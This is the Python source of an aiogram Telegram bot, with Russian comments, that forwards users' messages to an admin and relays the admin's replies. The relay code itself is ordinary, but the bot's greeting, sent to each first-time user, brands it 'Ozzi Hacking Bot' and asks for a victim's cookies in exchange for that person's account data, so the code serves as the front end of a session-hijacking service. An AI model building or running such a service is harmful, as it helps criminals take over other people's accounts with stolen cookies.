import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message

TOKEN = os.getenv("TOKEN")  # Токен бота
ADMIN_ID = int(os.getenv("ADMIN_ID"))  # Твой Telegram ID (число)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Словарь для хранения ID пользователей, которым уже отправили "Спасибо"
user_notified = set()
user_messages = {}

@dp.message()
async def handle_messages(message: Message):
    """Пересылает сообщения админу и позволяет отвечать обратно"""
    user_id = message.from_user.id

    if user_id != ADMIN_ID:  # Обычный пользователь
        user_messages[message.message_id] = user_id  # Запоминаем отправителя

        # Пересылаем админу (без reply_to_message_id)
        text = f"Сообщение от {message.from_user.full_name} (@{message.from_user.username}):\n\n{message.text}"
        sent_msg = await bot.send_message(ADMIN_ID, text)

        # Связываем ID сообщения пользователя и ID пересланного сообщения
        user_messages[sent_msg.message_id] = user_id

        # Отправляем "Спасибо" только если пользователь пишет впервые
        if user_id not in user_notified:
            await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунт тебе :)")
            user_notified.add(user_id)  # Запоминаем, что пользователю уже ответили

    else:  # Админ отвечает
        if message.reply_to_message and message.reply_to_message.message_id in user_messages:
            target_user = user_messages[message.reply_to_message.message_id]  # Находим ID пользователя
            await bot.send_message(target_user, f"{message.text}")

async def main():
    """Запуск бота"""
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
